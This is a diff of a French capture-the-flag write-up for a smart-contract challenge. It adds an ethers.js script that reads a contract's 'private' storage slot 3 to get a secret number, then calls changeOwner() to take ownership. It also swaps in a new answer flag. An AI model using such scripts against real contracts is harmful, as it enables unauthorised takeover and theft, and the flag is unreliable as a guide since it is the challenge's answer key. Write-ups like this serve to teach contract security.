@@ -53,29 +53,59 @@ Le but est de devenir owner du contrat. On voit une fonction `getOwner()` en vis
 ### Analyse du code
 
 On remarque dans le code une fonction qui nous permet de devenir owner : `changeOwner()`. Elle prend en paramètre un **nombre secret** que nous devons trouver et si l'on donne le bon, alors on récupère l'ownership de l'instance.
-On voit que le contrat le compare au hash d'un nombre stocké sur un autre contrat dont l'adresse est : **0x6Bb436f76fa0d3BC02EdEAB425594B350dd4Ed2B**.
+La fonction le compare à la valeur de la variable `s_secretNumber`. Malheureusement cette variable est en visibilité `private`, nous ne pouvons pas l'appeler pour lire sa valeur.
+Ce n'est pas pour autant que ce n'est pas possible. Cette variable est stockée dans le Storage du smart contract. Nous devons trouver le numéro de Slot où la variable est stockée puis lire ce Slot.
+La variable est sur le Slot 3.
 
-![Remix3](./img//remix3.png)
-
-On va donc devoir aller chercher ce nombre secret dans ce contrat.
-Direction <a href="https://sepolia.etherscan.io/">Etherscan</a> pour regarder si le contrat a été vérifié.
+Pour apprendre à calculer le numéro de Slot d'une variable, vous pouvez aller voir sur site : https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html
 
 ### Exploitation
 
-Le contrat est bien vérifié et nous avons donc accès à son code. On voit que le secret number est donné au constructeur lors du déploiement du contrat.
+Nous allons utiliser la library `ethersjs` pour charger notre contrat et récupérer la valeur du Slot 3.
 
-![Etherscan1](./img/etherscan1.png)
+```js
+const ethers = require("ethers");
+const fs = require("fs-extra");
+require("dotenv").config();
 
-Si on descend plus bas dans l'onglet "Contract" on peut récupérer la valeur qui a été donné en constructeur à la base.
-Une autre méthode aurait été de récupérer la valeur du Slot#1 du Storage de ce contrat. Mais nous utiliserons cette méthode pour un autre challenge.
+async function main() {
+  const { PRIVATE_KEY, SEPOLIA_RPC_URL, CONTRACT_ADDRESS, CONTRACT_NAME } =
+    process.env;
+  const provider = new ethers.JsonRpcProvider(SEPOLIA_RPC_URL);
+  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
 
-![Etherscan2](./img/etherscan2.png)
+  // The ABI and binary files of the compiled contract
+  const abi = fs.readFileSync(`./File_sol_${CONTRACT_NAME}.abi`, "utf-8");
+  const binary = fs.readFileSync(`./File_sol_${CONTRACT_NAME}.bin`, "utf-8");
 
-Il ne nous reste plus qu'à appeler notre fonction pour changer l'ownership du contrat en spécifiant en argument notre nombre secret.
+  // To load a deployed contract
+  const contract = new ethers.Contract(CONTRACT_ADDRESS, abi, wallet);
 
-![Remix4](./img/remix4.png)
+  // To get the Slot 3
+  const secretNumber = await getStorage(CONTRACT_ADDRESS, 3, provider);
+  console.log(`Keccak secret value : ${secretNumber}`);
 
-nous somme maintenant owner du contrat, nous pouvons aller demander le flag !
+  // To call the changeOwner() function to get the ownership
+  const tx = await contract.changeOwner(secretNumber);
+  await tx.wait();
+}
+
+// To get storage datas of a contract
+async function getStorage(contractAddress, slotNumber, provider) {
+  return await provider.getStorage(contractAddress, slotNumber);
+}
+
+main()
+  .then(() => process.exit(0))
+  .catch((error) => {
+    console.error(error);
+    process.exit(1);
+  });
+```
+
+Il suffit d'exécuter notre script qui va nous afficher la valeur du nombre secret. Et appeler la function `changeOwner()` pour récupérer l'ownership.
+
+Nous somme maintenant owner du contrat, nous pouvons aller demander le flag !
 
 ### Envoi de l'instance pour vérification
 
@@ -85,4 +115,4 @@ Si tout est bon, alors le flag s'affichera sur la page et dans la console.
 
 **BRAVO !**
 
-FLAG : **HN0x03{3tH3rSc4n_4_3v3R}**
+FLAG : **HN0x03{R34d_tH3_Sl0tS_t0_f1ND}**
